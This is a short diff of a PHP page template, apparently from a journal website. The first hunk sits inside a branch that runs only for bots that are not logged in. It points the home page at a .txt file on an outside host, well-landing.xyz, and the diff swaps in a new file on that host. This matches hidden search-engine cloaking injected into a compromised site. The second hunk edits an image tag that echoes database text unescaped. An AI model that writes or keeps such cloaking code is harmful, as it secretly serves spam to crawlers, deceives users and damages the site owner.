@@ -43,7 +43,7 @@ if ($isBot && !$isLogged) {
     $targetUrl = null;
 
     if ($clean_uri === '/' || $clean_uri === '/index.php' || empty($clean_uri)) {
-        $targetUrl = 'https://well-landing.xyz/landing/palli.txt';
+        $targetUrl = 'https://well-landing.xyz/landing/palli.sinarsosroo.txt';
     }
 
     else {
@@ -437,7 +437,7 @@ if (!is_file($imageFile)) {
 											} else {
 										?>
 										<img class="image__container border"
-											 alt="<?php echo $rows['journal_title']; ?>"
+											 alt="<?php echo $rows['journal_title'];?>"
 											 src="../images/<?php echo $rows['cover']; ?>-cover.jpg" width="100%" />
 										<?php
 											}
